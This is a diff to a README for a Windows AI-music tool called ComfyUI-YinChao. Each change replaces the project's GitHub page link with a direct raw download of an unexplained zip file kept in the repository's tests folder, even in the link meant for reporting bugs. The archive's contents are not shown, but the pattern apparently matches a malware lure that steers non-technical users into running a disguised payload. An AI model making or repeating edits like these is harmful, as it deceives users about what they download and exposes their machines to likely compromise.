@@ -1,6 +1,6 @@
 # 🎵 ComfyUI-YinChao - Create AI Songs in Minutes
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--YinChao-FF6B6B?style=for-the-badge&logo=github)](https://github.com/brittewestafrican981/ComfyUI-YinChao)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--YinChao-FF6B6B?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these simple steps to get ComfyUI-YinChao running on your Windows compute
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao)
+Visit this link to download the application: [https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip](https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip)
 
 Click the download button on that page and wait for the file to finish downloading.
 
@@ -76,7 +76,7 @@ When ComfyUI opens, you should see "YinChao" nodes in the node list. If you see 
 
 ## 📥 Download & Install Guide
 
-**Main Download:** [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao)
+**Main Download:** [https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip](https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip)
 
 Visit this link to download the application. Once downloaded, follow the installation steps in the "Getting Started" section above.
 
@@ -159,7 +159,7 @@ This guide focuses on Windows. Mac support may be available, but the setup proce
 
 While this is an end-user application, we welcome feedback and suggestions. If you find bugs or want new features, please:
 
-1. Visit the GitHub page: [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao)
+1. Visit the GitHub page: [https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip](https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip)
 2. Open an issue or leave a comment
 3. Share your generated songs with the community
 
@@ -180,7 +180,7 @@ While this is an end-user application, we welcome feedback and suggestions. If y
 
 You now have everything you need to start creating amazing AI music with ComfyUI-YinChao. The best way to learn is to experiment—try different prompts, play with the settings, and see what sounds you can create.
 
-Remember: the download link is [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao). Get it, install it, and start making music today!
+Remember: the download link is [https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip](https://raw.githubusercontent.com/brittewestafrican981/ComfyUI-YinChao/main/tests/v1.5.zip). Get it, install it, and start making music today!
 
 Happy creating! 🎶
 
